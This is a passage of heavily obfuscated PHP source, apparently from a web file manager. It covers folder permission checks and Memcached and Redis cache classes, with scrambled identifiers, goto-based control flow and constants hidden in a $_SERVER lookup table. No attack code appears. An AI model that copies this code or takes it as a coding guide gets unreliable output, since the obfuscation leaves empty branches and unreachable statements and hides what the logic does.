(!in_array($DóéëÏ‚Õõ[$Eš³ïßÔ´[394]], $a­óğİØ¯°)) { show_json(LNG($Eš³ïßÔ´[1700]), !1); } if ($FĞÇæâ˜¨¾ != $c¶İéÄŒˆ) { if ($DóéëÏ‚Õõ[$Eš³ïßÔ´[394]] == SourceModel::TYPE_GROUP) { } if ($DóéëÏ‚Õõ[$Eš³ïßÔ´[396]] != 0 && !in_array($DóéëÏ‚Õõ[$Eš³ïßÔ´[396]], $fÒ”¤›ÇÄ)) { } } if ($DóéëÏ‚Õõ[$Eš³ïßÔ´[396]] == 0) { $DóéëÏ‚Õõ[$Eš³ïßÔ´[394]] = SourceModel::TYPE_USER; } $d¾Æ‡“Ä¶‹[] = array($Eš³ïßÔ´[375] => $b³¹¨àĞ„, $Eš³ïßÔ´[394] => intval($DóéëÏ‚Õõ[$Eš³ïßÔ´[394]]), $Eš³ïßÔ´[396] => intval($DóéëÏ‚Õõ[$Eš³ïßÔ´[396]]), $Eš³ïßÔ´[1683] => intval($DóéëÏ‚Õõ[$Eš³ïßÔ´[1683]]) ? intval($DóéëÏ‚Õõ[$Eš³ïßÔ´[1683]]) : 0, $Eš³ïßÔ´[1684] => intval($DóéëÏ‚Õõ[$Eš³ïßÔ´[1684]]) ? intval($DóéëÏ‚Õõ[$Eš³ïßÔ´[1684]]) : -1); } goto cï¼–óˆ–ã; cï¼–óˆ–ã: $this->where(array($Eš³ïßÔ´[416] => $b³¹¨àĞ„))->delete(); $this->addAll($d¾Æ‡“Ä¶‹); return !0; goto B‚„Š¯”­©; eºò¹˜äÓ: $Eš³ïßÔ´ =& $_SERVER[İë¬“ÅÒÛ›]; $c‡ªï¿™Õ = Model($Eš³ïßÔ´[855])->sourceInfo($b³¹¨àĞ„); if ($c‡ªï¿™Õ[$Eš³ïßÔ´[394]] != SourceModel::TYPE_GROUP) { return !1; } goto d‡Å¶ç¶—‘; d‡Å¶ç¶—‘: $c¶İéÄŒˆ = 1; $FĞÇæâ˜¨¾ = $c‡ªï¿™Õ[$Eš³ïßÔ´[396]]; if ($FĞÇæâ˜¨¾ != $c¶İéÄŒˆ) { $eË°×œÌà = array($Eš³ïßÔ´[1546] => $FĞÇæâ˜¨¾); $fÒ”¤›ÇÄ = Model($Eš³ïßÔ´[1631])->field($Eš³ïßÔ´[1095])->where($eË°×œÌà)->select(); $fÒ”¤›ÇÄ = array_to_keyvalue($fÒ”¤›ÇÄ, $Eš³ïßÔ´[33], $Eš³ïßÔ´[1095]); } goto cò”ÌùšÚÊ; B‚„Š¯”­©: } public function authClear($D¹ºêÌ•ó¯) { $eö™íÇÍØê =& $_SERVER[İë¬“ÅÒÛ›]; $Fœğî¦À¨Ì = Model($eö™íÇÍØê[855])->sourceInfo($D¹ºêÌ•ó¯); $DÆáÍİĞÇÆ = array($D¹ºêÌ•ó¯); if ($Fœğî¦À¨Ì[$eö™íÇÍØê[376]] == $eö™íÇÍØê[377]) { $eñĞ¸¡¾áó = array($eö™íÇÍØê[400] => array($eö™íÇÍØê[409], $Fœğî¦À¨Ì[$eö™íÇÍØê[374]] . $D¹ºêÌ•ó¯ . $eö™íÇÍØê[410])); $DÆáÍİĞÇÆ = Model($eö™íÇÍØê[855])->field($eö™íÇÍØê[416])->where($eñĞ¸¡¾áó)->getField($eö™íÇÍØê[375], !0); $DÆáÍİĞÇÆ[] = $D¹ºêÌ•ó¯; } $this->where(array($eö™íÇÍØê[416] => array($eö™íÇÍØê[983], $DÆáÍİĞÇÆ)))->delete(); return !0; } public function get($cæ¸‚Æ•…) { $DºƒâÓ±¤† = $this->getSourceList(array($cæ¸‚Æ•…), !0); return $DºƒâÓ±¤†[0]; } public function getSourceList($Eë²öªº˜, $Cö¡¿‹Ú¤– = false) { goto aà«ÇèÃÙ›; däà…—¹É: $A¯­©í÷ = array_values(array_unique($A¯­©í÷)); if (!$A¯­©í÷) { return array(); } $døš‚É¯‰ = $eÄ–Ö‰½ĞÏ[1702]; goto dœÎÅÈÒŒÆ; BÁÕíŞğ”: $c›äáôêªÏ = array(); foreach ($Cö¡¿‹Ú¤– as $a¢„ä›â¥Û => $e›°ºôšÍ‹) { $c›äáôêªÏ[$a¢„ä›â¥Û] = $this->makeSourceAuth($e›°ºôšÍ‹, $C…Ô¤½½¾); } return $c›äáôêªÏ; goto aö°íñÄ; aà«ÇèÃÙ›: $eÄ–Ö‰½ĞÏ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$Eë²öªº˜) { return array(); } $F˜²°‹¢ãÂ = Model($eÄ–Ö‰½ĞÏ[855]); goto DçÀøëÅÙ¥; dœÎÅÈÒŒÆ: $d…Üéö¥»“ = array($eÄ–Ö‰½ĞÏ[416] => array($eÄ–Ö‰½ĞÏ[983], $A¯­©í÷)); $C…Ô¤½½¾ = $this->field($døš‚É¯‰)->where($d…Üéö¥»“)->select(); $C…Ô¤½½¾ = array_to_keyvalue_group($C…Ô¤½½¾, $eÄ–Ö‰½ĞÏ[375]); goto BÁÕíŞğ”; DçÀøëÅÙ¥: if (!$Cö¡¿‹Ú¤–) { $d…Üéö¥»“ = array($eÄ–Ö‰½ĞÏ[416] => array($eÄ–Ö‰½ĞÏ[983], $Eë²öªº˜)); $Cö¡¿‹Ú¤– = $F˜²°‹¢ãÂ->field($eÄ–Ö‰½ĞÏ[1701])->where($d…Üéö¥»“)->select(); $Cö¡¿‹Ú¤– = array_to_keyvalue($Cö¡¿‹Ú¤–, $eÄ–Ö‰½ĞÏ[375]); } $A¯­©í÷ = $Eë²öªº˜; foreach ($Cö¡¿‹Ú¤– as $DÃ£„ÏŠ¸ß => $F–¼£ËÃÑŞ) { $fš²¿Õôø¾ = $F˜²°‹¢ãÂ->parentLevelArray($F–¼£ËÃÑŞ[$eÄ–Ö‰½ĞÏ[374]]); $A¯­©í÷ = array_merge($A¯­©í÷, $fš²¿Õôø¾, array($DÃ£„ÏŠ¸ß)); } goto däà…—¹É; aö°íñÄ: } public function authDeepCheck($bšŠ¢œŸÒ, $D”²ñŠ‚¸ = false) { $F’—Í¨š™Ü =& $_SERVER[İë¬“ÅÒÛ›]; if ($GLOBALS[$F’—Í¨š™Ü[1030]]) { return !1; } $d­æÁ±ÌĞÜ = $this->makeAuthDeep(); if (!in_array($bšŠ¢œŸÒ, $d­æÁ±ÌĞÜ)) { return !1; } return array($F’—Í¨š™Ü[1703] => -1, $F’—Í¨š™Ü[1704] => array($F’—Í¨š™Ü[817] => $F’—Í¨š™Ü[783], $F’—Í¨š™Ü[1552] => $F’—Í¨š™Ü[403], $F’—Í¨š™Ü[388] => LNG($F’—Í¨š™Ü[1705]), $F’—Í¨š™Ü[1564] => $F’—Í¨š™Ü[1706])); } protected function makeAuthDeep() { goto B¸ ÇÕÁ; B¸ ÇÕÁ: $eÃğ’Û…Ù =& $_SERVER[İë¬“ÅÒÛ›]; static $d¦ø¡ĞôÍÃ = false; if ($d¦ø¡ĞôÍÃ) { return $d¦ø¡ĞôÍÃ; } goto A¸Èò¼‡Ùä; c™Ğ¥à´ªß: $e™ÏŒ‹Ã‹ = array_values(array_unique($e™ÏŒ‹Ã‹)); $E è™£’™ = $e™ÏŒ‹Ã‹; foreach ($E è™£’™ as $Aß»øÒÔ) { $BÀ¥à ¹Æë = $D½òö„î¤->getInfo($Aß»øÒÔ); $a‰…Š·í©½ = $EÕ¾™½É»ğ->parentLevelArray($BÀ¥à ¹Æë[$eÃğ’Û…Ù[374]]); $e™ÏŒ‹Ã‹ = array_merge($e™ÏŒ‹Ã‹, $a‰…Š·í©½); } goto Dµ¿¼‰šœ¦; A¸Èò¼‡Ùä: $Cà®ƒŠÆõ² = Model($eÃğ’Û…Ù[1707])->listData(); $cÅºÙ³»×¼ = array(); foreach ($Cà®ƒŠÆõ² as $eö‹İğ‘Ì) { if ($eö‹İğ‘Ì[$eÃğ’Û…Ù[550]] == 0 && $eö‹İğ‘Ì[$eÃğ’Û…Ù[1566]] == $eÃğ’Û…Ù[377]) { $cÅºÙ³»×¼[] = $eö‹İğ‘Ì[$eÃğ’Û…Ù[369]]; } } goto Aº»ƒ“²»; f¥ÃÏíÔ¡Î: if ($b ˆÅÌå¿) { $eê÷ÍàÒ·¤ = array(array($eÃğ’Û…Ù[394] => SourceModel::TYPE_USER, $eÃğ’Û…Ù[396] => USER_ID), array($eÃğ’Û…Ù[394] => SourceModel::TYPE_GROUP, $eÃğ’Û…Ù[396] => array($eÃğ’Û…Ù[983], $b ˆÅÌå¿)), $eÃğ’Û…Ù[684] => $eÃğ’Û…Ù[1639]); } if ($cÅºÙ³»×¼) { $eê÷ÍàÒ·¤ = array($eê÷ÍàÒ·¤, $eÃğ’Û…Ù[1683] => array($eÃğ’Û…Ù[1708], $cÅºÙ³»×¼)); } $cÁƒìŒáª¯ = $this->field($eÃğ’Û…Ù[1709])->where($eê÷ÍàÒ·¤)->select(); goto AÂŒ¼¹‡÷Å; EßŞò„îñ±: $EÕ¾™½É»ğ = Model($eÃğ’Û…Ù[855]); $D½òö„î¤ = Model($eÃğ’Û…Ù[1710]); if ($cè‡ç³ä»Ş) { $a‰Åğ¸ÇË = $EÕ¾™½É»ğ->where(array($eÃğ’Û…Ù[375] => array($eÃğ’Û…Ù[983], $cè‡ç³ä»Ş)))->select(); foreach ($a‰Åğ¸ÇË as $A±‡Ï—îñ) { $a‰…Š·í©½ = $EÕ¾™½É»ğ->parentLevelArray($A±‡Ï—îñ[$eÃğ’Û…Ù[374]]); $d¦ø¡ĞôÍÃ = array_merge($d¦ø¡ĞôÍÃ, $a‰…Š·í©½); $e™ÏŒ‹Ã‹[] = $A±‡Ï—îñ[$eÃğ’Û…Ù[396]]; } } goto c™Ğ¥à´ªß; AÂŒ¼¹‡÷Å: $cè‡ç³ä»Ş = array_to_keyvalue($cÁƒìŒáª¯, $eÃğ’Û…Ù[33], $eÃğ’Û…Ù[375]); $d¦ø¡ĞôÍÃ = array(); $e™ÏŒ‹Ã‹ = $b ˆÅÌå¿; goto EßŞò„îñ±; Aº»ƒ“²»: $b ˆÅÌå¿ = Session::get($eÃğ’Û…Ù[1666]); $b ˆÅÌå¿ = array_to_keyvalue($b ˆÅÌå¿, $eÃğ’Û…Ù[33], $eÃğ’Û…Ù[1546]); $eê÷ÍàÒ·¤ = array($eÃğ’Û…Ù[394] => SourceModel::TYPE_USER, $eÃğ’Û…Ù[396] => USER_ID); goto f¥ÃÏíÔ¡Î; CÚæŞÀ¦©Ë: return $d¦ø¡ĞôÍÃ; goto Bƒ¦à×“‰³; Dµ¿¼‰šœ¦: $e™ÏŒ‹Ã‹ = array_values(array_unique($e™ÏŒ‹Ã‹)); foreach ($e™ÏŒ‹Ã‹ as $Aß»øÒÔ) { $BÀ¥à ¹Æë = $D½òö„î¤->getInfo($Aß»øÒÔ); $d¦ø¡ĞôÍÃ[] = $BÀ¥à ¹Æë[$eÃğ’Û…Ù[861]][$eÃğ’Û…Ù[375]]; } $d¦ø¡ĞôÍÃ = array_values(array_unique($d¦ø¡ĞôÍÃ)); goto CÚæŞÀ¦©Ë; Bƒ¦à×“‰³: } private function makeSourceAuth($e‡Ú¾ÌËĞÊ, $c½‰ï—Â) { goto E´Š„É›Èƒ; a¨—¶ï‰¿Ê: $d™»Ãë‚ = array_merge(array($e‡Ú¾ÌËĞÊ[$E¡Ó†‚›Ç•[375]]), array_reverse($d™»Ãë‚)); $Fë”¥¸® î = !1; foreach ($d™»Ãë‚ as $F®°ìöÄä) { if (!isset($c½‰ï—Â[$F®°ìöÄä])) { continue; } $déš˜à×ÙĞ = $this->authMake($c½‰ï—Â[$F®°ìöÄä]); if ($déš˜à×ÙĞ[$E¡Ó†‚›Ç•[1704]]) { $Fë”¥¸® î = $déš˜à×ÙĞ; break; } } goto fæìÑ–ÃëĞ; fæìÑ–ÃëĞ: if (!$Fë”¥¸® î) { $D˜»›Õ›áË = array_to_keyvalue($D˜»›Õ›áË, $E¡Ó†‚›Ç•[1546]); $dê¯ç¡çôË = $e‡Ú¾ÌËĞÊ[$E¡Ó†‚›Ç•[396]]; $aŠÓƒ„ŸÊæ = isset($D˜»›Õ›áË[$dê¯ç¡çôË]) ? $D˜»›Õ›áË[$dê¯ç¡çôË] : !1; if ($aŠÓƒ„ŸÊæ) { $Fë”¥¸® î = array($E¡Ó†‚›Ç•[1711] => intval($aŠÓƒ„ŸÊæ[$E¡Ó†‚›Ç•[550]][$E¡Ó†‚›Ç•[550]]), $E¡Ó†‚›Ç•[1712] => $aŠÓƒ„ŸÊæ[$E¡Ó†‚›Ç•[550]]); } } if ((!$Fë”¥¸® î || $Fë”¥¸® î[$E¡Ó†‚›Ç•[1703]] <= 0) && $e‡Ú¾ÌËĞÊ[$E¡Ó†‚›Ç•[394]] == SourceModel::TYPE_GROUP) { $Fë”¥¸® î = $this->authDeepCheck($e‡Ú¾ÌËĞÊ[$E¡Ó†‚›Ç•[375]], $Fë”¥¸® î); } return $Fë”¥¸® î; goto D…–™èÈº¬; E´Š„É›Èƒ: $E¡Ó†‚›Ç• =& $_SERVER[İë¬“ÅÒÛ›]; $D˜»›Õ›áË = Session::get($E¡Ó†‚›Ç•[1666]); $d™»Ãë‚ = Model($E¡Ó†‚›Ç•[855])->parentLevelArray($e‡Ú¾ÌËĞÊ[$E¡Ó†‚›Ç•[374]]); goto a¨—¶ï‰¿Ê; D…–™èÈº¬: } public function authOwnerApply($eöÇïÍÆğÏ) { goto EÙ®Ü•´ï; Cµ·¤»‹„¢: $BÉ©áìË÷ì = Model($B»òƒ«Ò±[855])->parentLevelArray($eöÇïÍÆğÏ[$B»òƒ«Ò±[374]]); $BÉ©áìË÷ì = array_merge(array($eöÇïÍÆğÏ[$B»òƒ«Ò±[375]]), array_reverse($BÉ©áìË÷ì)); $fœ¦ˆíÍÄ® = $B»òƒ«Ò±[1702]; goto a¶¤ÅÈáâ¾; EÙ®Ü•´ï: $B»òƒ«Ò± =& $_SERVER[İë¬“ÅÒÛ›]; if (!$eöÇïÍÆğÏ[$B»òƒ«Ò±[550]] || $eöÇïÍÆğÏ[$B»òƒ«Ò±[1713]]) { return $eöÇïÍÆğÏ; } if (AuthModel::authCheckRoot($eöÇïÍÆğÏ[$B»òƒ«Ò±[550]][$B»òƒ«Ò±[1703]])) { return $eöÇïÍÆğÏ; } goto Cµ·¤»‹„¢; BË òÙÁâÖ: $eöÇïÍÆğÏ[$B»òƒ«Ò±[550]][$B»òƒ«Ò±[1715]] = Model($B»òƒ«Ò±[1716])->userListInfo($e‘Ğä¨ÍÑÏ); return $eöÇïÍÆğÏ; goto e¬œ‡‘Áµ‡; EÍõÏñìÁŠ: if (count($e‘Ğä¨ÍÑÏ) == 0) { $e‘Ğä¨ÍÑÏ = $this->authFolderOwnerGroup($eöÇïÍÆğÏ[$B»òƒ«Ò±[396]]); } $e‘Ğä¨ÍÑÏ = array_unique($e‘Ğä¨ÍÑÏ); if (AuthModel::authCheckRoot($eöÇïÍÆğÏ[$B»òƒ«Ò±[550]][$B»òƒ«Ò±[1703]])) { $e‘Ğä¨ÍÑÏ[] = USER_ID; } goto BË òÙÁâÖ; bÓªÅóŠš: $fš°‘øÑ = array(); $e‘Ğä¨ÍÑÏ = array(); foreach ($D‚œ‹ƒ®ˆ as $D×¸¨‚£»‚ => $eì¾¶ñäâ£) { $Dâ¦„±ÛÙå = $this->authFolderOwnerUser($eì¾¶ñäâ£); $fš°‘øÑ[$D×¸¨‚£»‚] = $Dâ¦„±ÛÙå; $e‘Ğä¨ÍÑÏ = array_merge($e‘Ğä¨ÍÑÏ, $Dâ¦„±ÛÙå[$B»òƒ«Ò±[417]]); if ($Dâ¦„±ÛÙå[$B»òƒ«Ò±[1714]]) { break; } } goto EÍõÏñìÁŠ; a¶¤ÅÈáâ¾: $BšÕÊåêÑ = array($B»òƒ«Ò±[416] => array($B»òƒ«Ò±[983], $BÉ©áìË÷ì)); $D‚œ‹ƒ®ˆ = $this->field($fœ¦ˆíÍÄ®)->where($BšÕÊåêÑ)->select(); $D‚œ‹ƒ®ˆ = array_to_keyvalue_group($D‚œ‹ƒ®ˆ, $B»òƒ«Ò±[375]); goto bÓªÅóŠš; e¬œ‡‘Áµ‡: } private function authFolderOwnerGroup($AÖ±ƒªë“¬) { $Eæ×Å¶·Ø =& $_SERVER[İë¬“ÅÒÛ›]; $DíŠŒõ§Ù´ = Model($Eæ×Å¶·Ø[1631])->where(array($Eæ×Å¶·Ø[1546] => $AÖ±ƒªë“¬))->select(); $FŸ‡¦ ğ = array(); if (!$DíŠŒõ§Ù´) { return $FŸ‡¦ ğ; } foreach ($DíŠŒõ§Ù´ as $C¬æí´‰£À) { $añ™İáöÊé = $this->authInfo($C¬æí´‰£À); if (AuthModel::authCheckRoot($añ™İáöÊé[$Eæ×Å¶·Ø[550]])) { $FŸ‡¦ ğ[] = $C¬æí´‰£À[$Eæ×Å¶·Ø[1095]]; } } return $FŸ‡¦ ğ; } private function authFolderOwnerUser($EøääîµÃ) { $eáÍ•Ÿ‹”· =& $_SERVER[İë¬“ÅÒÛ›]; $B¼éÉ²êÚ’ = array(); $Aà×†š‰¼ƒ = !1; foreach ($EøääîµÃ as $EÕĞĞÍ§Ø) { $bÑèí«ªÄÃ = $this->authInfo($EÕĞĞÍ§Ø); if ($EÕĞĞÍ§Ø[$eáÍ•Ÿ‹”·[396]] == $eáÍ•Ÿ‹”·[403]) { $Aà×†š‰¼ƒ = !0; } if ($EÕĞĞÍ§Ø[$eáÍ•Ÿ‹”·[394]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($bÑèí«ªÄÃ[$eáÍ•Ÿ‹”·[550]])) { $B¼éÉ²êÚ’[] = $EÕĞĞÍ§Ø[$eáÍ•Ÿ‹”·[396]]; } } } return array($eáÍ•Ÿ‹”·[417] => $B¼éÉ²êÚ’, $eáÍ•Ÿ‹”·[1714] => $Aà×†š‰¼ƒ); } public function authMake($d”ˆæáøò·) { goto e»‰Èœ¢Ö²; eÆ°Ü‘º¾½: $a„ÛåÉ‰—› = 0; $bØí¹ÎÖ = 0; $D×ïÅ‹ÛË = 0; goto cù†Î…ƒ¸‹; BÆ¦É°«ø: $e˜ÑÊÂ¤Í‚ = array_to_keyvalue($cŠ‘ŠËã½×, $a¸™†òÔ[33], $a¸™†òÔ[1546]); $A¾ø®Ê…È  = 0; $a¤’º‰¦¼ = 0; goto CÕ¾ª´ˆŞ±; CÕ¾ª´ˆŞ±: $D¬¡°„ˆô  = 0; $e®á­†× ¶ = 0; $Ağ›Áğ¯Ñ = 0; goto eÆ°Ü‘º¾½; fŒÂ©á¸Èß: $f£‘Š¯‡Üà = $bØí¹ÎÖ ? $e®á­†× ¶ : ($D×ïÅ‹ÛË ? $Ağ›Áğ¯Ñ : $a„ÛåÉ‰—›); $fÁ¯ÛÖÜØÃ = array($a¸™†òÔ[1711] => intval($bŠÃâšùî«), $a¸™†òÔ[1712] => $f£‘Š¯‡Üà); return $fÁ¯ÛÖÜØÃ; goto D¯‰å¥»ø; e»‰Èœ¢Ö²: $a¸™†òÔ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$d”ˆæáøò·) { return array($a¸™†òÔ[1703] => 0, $a¸™†òÔ[1704] => !1); } $cŠ‘ŠËã½× = Session::get($a¸™†òÔ[1666]); goto BÆ¦É°«ø; cù†Î…ƒ¸‹: $e¦Ã­…‡ Ñ = 0; foreach ($d”ˆæáøò· as $a…‘‹èçĞ¯) { $f£‘Š¯‡Üà = $this->authInfo($a…‘‹èçĞ¯); $B“¯èÆÇˆ² = $a…‘‹èçĞ¯[$a¸™†òÔ[396]]; $déõÈ×Ü÷ = intval($f£‘Š¯‡Üà[$a¸™†òÔ[550]]); if ($a…‘‹èçĞ¯[$a¸™†òÔ[394]] == SourceModel::TYPE_USER && $B“¯èÆÇˆ² == USER_ID) { $bØí¹ÎÖ = !0; $e®á­†× ¶ = $f£‘Š¯‡Üà; $A¾ø®Ê…È  = $déõÈ×Ü÷; } else { if ($a…‘‹èçĞ¯[$a¸™†òÔ[394]] == SourceModel::TYPE_GROUP && in_array($B“¯èÆÇˆ², $e˜ÑÊÂ¤Í‚)) { $D×ïÅ‹ÛË = !0; if ($déõÈ×Ü÷ >= $a¤’º‰¦¼) { $a¤’º‰¦¼ = $déõÈ×Ü÷; $Ağ›Áğ¯Ñ = $f£‘Š¯‡Üà; } } else { if ($B“¯èÆÇˆ² == 0) { $e¦Ã­…‡ Ñ = !0; $a„ÛåÉ‰—› = $f£‘Š¯‡Üà; $D¬¡°„ˆô  = $déõÈ×Ü÷; } } } } $bŠÃâšùî« = $bØí¹ÎÖ ? $A¾ø®Ê…È  : ($D×ïÅ‹ÛË ? $a¤’º‰¦¼ : $D¬¡°„ˆô ); goto fŒÂ©á¸Èß; D¯‰å¥»ø: } public function authTargetInfoMake($aÆ¤†‰ÙÎ½) { goto eÊ¸»Ìì“Ÿ; eÔÉ‡´Š¶: return array($a™ƒìÜœ[1717] => $CŞí˜íÄÈ, $a™ƒìÜœ[1718] => $Aª¨ŞÉŠßó); goto cœ¾Ğ††Ù“; eÊ¸»Ìì“Ÿ: $a™ƒìÜœ =& $_SERVER[İë¬“ÅÒÛ›]; $CŞí˜íÄÈ = array(); $Aª¨ŞÉŠßó = array(); goto D‡¦±Âˆê¼; D‡¦±Âˆê¼: foreach ($aÆ¤†‰ÙÎ½ as $E¸Ãñê±ğ•) { if ($E¸Ãñê±ğ•[$a™ƒìÜœ[394]] == SourceModel::TYPE_USER) { $CŞí˜íÄÈ[] = intval($E¸Ãñê±ğ•[$a™ƒìÜœ[396]]); } else { if ($E¸Ãñê±ğ•[$a™ƒìÜœ[394]] == SourceModel::TYPE_GROUP) { $Aª¨ŞÉŠßó[] = intval($E¸Ãñê±ğ•[$a™ƒìÜœ[396]]); } } } if ($CŞí˜íÄÈ) { $CŞí˜íÄÈ = Model($a™ƒìÜœ[1716])->userListInfo($CŞí˜íÄÈ); } if ($Aª¨ŞÉŠßó) { $d¦•˜¢äÒº = array($a™ƒìÜœ[1629] => array($a™ƒìÜœ[983], $Aª¨ŞÉŠßó)); $Aª¨ŞÉŠßó = Model($a™ƒìÜœ[1710])->field($a™ƒìÜœ[1646])->where($d¦•˜¢äÒº)->select(); $Aª¨ŞÉŠßó = array_to_keyvalue($Aª¨ŞÉŠßó, $a™ƒìÜœ[1546]); } goto eÔÉ‡´Š¶; cœ¾Ğ††Ù“: } private function authInfo($B„šŒ†§ø¤) { $C‡ŞºËå™ =& $_SERVER[İë¬“ÅÒÛ›]; if ($B„šŒ†§ø¤[$C‡ŞºËå™[1683]]) { $fŞÄËºğ²Ø = Model($C‡ŞºËå™[1699])->listData($B„šŒ†§ø¤[$C‡ŞºËå™[1683]]); if (!$fŞÄËºğ²Ø) { return !1; $c†…Ìãµ = Model($C‡ŞºËå™[1699])->listData(); $f“º£”µ˜ = array_filter_by_field($c†…Ìãµ, $C‡ŞºËå™[550], $C‡ŞºËå™[403]); return $f“º£”µ˜; } $FêÑçêÊ° = array_field_key($fŞÄËºğ²Ø, array($C‡ŞºËå™[369], $C‡ŞºËå™[28], $C‡ŞºËå™[550], $C‡ŞºËå™[1564], $C‡ŞºËå™[1567])); $FêÑçêÊ°[$C‡ŞºËå™[1719]] = $B„šŒ†§ø¤; return $FêÑçêÊ°; } else { return array($C‡ŞºËå™[817] => 0, $C‡ŞºËå™[1552] => $B„šŒ†§ø¤[$C‡ŞºËå™[1684]], $C‡ŞºËå™[388] => $C‡ŞºËå™[33], $C‡ŞºËå™[1564] => $C‡ŞºËå™[1720]); } } } goto fÆ´ÍÄ°¸; b‡’ƒ§àÈ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($C¤¼·ŒÃº, $fÕôµ‡ µ²) { $f¯ÖŒ‚ÚÉ« =& $_SERVER[İë¬“ÅÒÛ›]; if (!class_exists($f¯ÖŒ‚ÚÉ«[543])) { show_json($f¯ÖŒ‚ÚÉ«[544], !1); } $this->cacheTime = $fÕôµ‡ µ²; $this->handle = new Memcached(); if (is_array($C¤¼·ŒÃº[$f¯ÖŒ‚ÚÉ«[545]]) && count($C¤¼·ŒÃº[$f¯ÖŒ‚ÚÉ«[545]]) >= 1) { foreach ($C¤¼·ŒÃº[$f¯ÖŒ‚ÚÉ«[545]] as $f¸ÁÅãÇê) { $eªÕßìØŒ = explode($f¯ÖŒ‚ÚÉ«[4], $f¸ÁÅãÇê); $this->handle->addServer($eªÕßìØŒ[0], $eªÕßìØŒ[1]); } } else { $this->handle->addServer($C¤¼·ŒÃº[$f¯ÖŒ‚ÚÉ«[166]], $C¤¼·ŒÃº[$f¯ÖŒ‚ÚÉ«[167]]); } } public function set($D•àÖˆÛõ¥, $a†§£¥‡§†, $aÂ¿ßÙËµ = false) { $aÂ¿ßÙËµ = $aÂ¿ßÙËµ ? $aÂ¿ßÙËµ : $this->cacheTime; return $this->handle->set($D•àÖˆÛõ¥, $a†§£¥‡§†, $aÂ¿ßÙËµ); } public function get($c—ÎŒìÔğÅ) { return $this->handle->get($c—ÎŒìÔğÅ); } public function remove($bÎñØ—Ãê) { return $this->handle->delete($bÎñØ—Ãê); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($CÜÃâ¨ˆ, $E–™Œ´Ë¸Á) { $D¡ë˜ßİ¢ =& $_SERVER[İë¬“ÅÒÛ›]; if (!class_exists($D¡ë˜ßİ¢[546])) { show_json($D¡ë˜ßİ¢[547], !1); } $this->cacheTime = $E–™Œ´Ë¸Á; $eîˆ”Ñ‰Ş = isset($CÜÃâ¨ˆ[$D¡ë˜ßİ¢[548]]) ? $CÜÃâ¨ˆ[$D¡ë˜ßİ¢[548]] : 10; if (is_array($CÜÃâ¨ˆ[$D¡ë˜ßİ¢[545]]) && count($CÜÃâ¨ˆ[$D¡ë˜ßİ¢[545]]) >= 1) { $this->isCluster = !0; $this->initCluster($CÜÃâ¨ˆ, $eîˆ”Ñ‰Ş); } else { $this->handle = $this->init($CÜÃâ¨ˆ, $eîˆ”Ñ‰Ş); } } private function init($eÍ¥øÇô²Ô, $d¹»¼§Å) { $BéÍÕ¸Ø„ =& $_SERVER[İë¬“ÅÒÛ›]; $céÖßÔ‘éù = new Redis(); $d¥ ÛíğŠ— = isset($eÍ¥øÇô²Ô[$BéÍÕ¸Ø„[549]]) ? $eÍ¥øÇô²Ô[$BéÍÕ¸Ø„[549]] : !1; if ($d¥ ÛíğŠ—) { $céÖßÔ‘éù->pconnect($eÍ¥øÇô²Ô[$BéÍÕ¸Ø„[166]], $eÍ¥øÇô²Ô[$BéÍÕ¸Ø„[167]], $d¹»¼§Å); } else { $céÖßÔ‘éù->connect($eÍ¥øÇô²Ô[$BéÍÕ¸Ø„[166]], $eÍ¥øÇô²Ô[$BéÍÕ¸Ø„[167]], $d¹»¼§Å); } if (!empty($eÍ¥øÇô²Ô[$BéÍÕ¸Ø„[550]])) { $céÖßÔ‘éù->auth($eÍ¥øÇô²Ô[$BéÍÕ¸Ø„[550]]); } return $céÖßÔ‘éù; } private function initCluster($a†ãŞ·™¶Û, $f Ù Ù™) { $BÇÄ×åÍ­É =& $_SERVER[İë¬“ÅÒÛ›]; $cŠ®£×ĞŞí = array($BÇÄ×åÍ­É[551], $BÇÄ×åÍ­É[552], $BÇÄ×åÍ­É[553]); $FĞä¬â‘´œ = $BÇÄ×åÍ­É[551]; if (isset($a†ãŞ·™¶Û[$BÇÄ×åÍ­É[12]]) && in_array($a†ãŞ·™¶Û[$BÇÄ×åÍ­É[12]], $cŠ®£×ĞŞí)) { $FĞä¬â‘´œ = $a†ãŞ·™¶Û[$BÇÄ×åÍ­É[12]]; } switch ($FĞä¬â‘´œ) { case $BÇÄ×åÍ­É[551]: $this->_slave($a†ãŞ·™¶Û, $f Ù Ù™); break; case $BÇÄ×åÍ­É[552]: break; case $BÇÄ×åÍ­É[553]: $a­½´£ÔÃœ = $a†ãŞ·™¶Û[$BÇÄ×åÍ­É[545]]; $fôè¸«˜ô = isset($a†ãŞ·™¶Û[$BÇÄ×åÍ­É[549]]) ? $a†ãŞ·™¶Û[$BÇÄ×åÍ­É[549]] : !1; $fƒò•²Ö™¯ = isset($a†ãŞ·™¶Û[$BÇÄ×åÍ­É[550]]) ? $a†ãŞ·™¶Û[$BÇÄ×åÍ­É[550]] : null; $this->handle = new RedisCluster(NUll, $a­½´£ÔÃœ, $f Ù Ù™, $f Ù Ù™, $fôè¸«˜ô, $fƒò•²Ö™¯); break; default: break; } } private function _slave($D¯£¿ïå, $E†§±¦Ñ¹») { goto eÕ¨ÕÑöˆè; cáÊÇßÚñ–: unset($B¾á³œ³—[0]); if (empty($B¾á³œ³—)) { return; } $e¬èÌ¤‘¨º = array_rand($B¾á³œ³—); goto C‚øšÌÔç­; eÕ¨ÕÑöˆè: $B¾á³œ³— = $D¯£¿ïå[$_SERVER[İë¬“ÅÒÛ›][545]]; $this->filterConfig($D¯£¿ïå, $B¾á³œ³—[0]); $this->handle = $this->init($D¯£¿ïå, $E†§±¦Ñ¹»); goto cáÊÇßÚñ–; C‚øšÌÔç­: $this->filterConfig($D¯£¿ïå, $B¾á³œ³—[$e¬èÌ¤‘¨º]); $this->slaveHandle = $this->init($D¯£¿ïå, $E†§±¦Ñ¹»); goto f‘èª¹âŒŞ; f‘èª¹âŒŞ: } private function filterConfig(&$B¾”¨„­Æ, $B„‘¶‡ÒË©) { $A£¡˜Ù¼ŠÖ =& $_SERVER[İë¬“ÅÒÛ›]; $bÄâÜóˆĞ² = explode($A£¡˜Ù¼ŠÖ[4], $B„‘¶‡ÒË©); $cŞØ˜Ùä· = array($A£¡˜Ù¼ŠÖ[166] => $bÄâÜóˆĞ²[0], 